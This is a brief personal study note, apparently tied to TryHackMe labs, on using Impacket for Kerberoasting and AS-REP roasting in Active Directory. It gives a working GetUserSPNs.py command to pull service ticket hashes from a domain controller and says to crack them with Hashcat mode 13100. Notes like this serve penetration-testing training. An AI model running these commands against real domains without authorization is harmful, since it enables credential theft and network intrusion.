# Using Impacket

author:: Nathan Acks  
date:: 2021-12-06

## Kerberoasting

Impacket can identify kerberoastable accounts and dump packets remotely. It comes standard with Kali Linux.

```bash
python3 \
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
${DOMAIN}/${USER}:${PASSWORD} \
-dc-ip $DOMAIN_CONTROLLER_IP -request
```

The password hashes output here can then be cracked with Hashcat (use the 13100 hash mode).

## AS-REP Roasting

Impacket (via GetNPUsers.py) support AS-REP roasting. However, GetNPUsers.py requires that user accounts already be enumerated and roastable accounts identified.

When using GetNPUsers.py, specify the target as `${DOMAIN}/` (i.e., leave off the user-part).

## References

* [TryHackMe: Attacking Kerberos](tryhackme-attacking-kerberos.md)
* [Attacktive Directory](tryhackme-attacktive-directory.md)
* [Kerberos](kerberos.md)
* [Using Hashcat](hashcat.md)
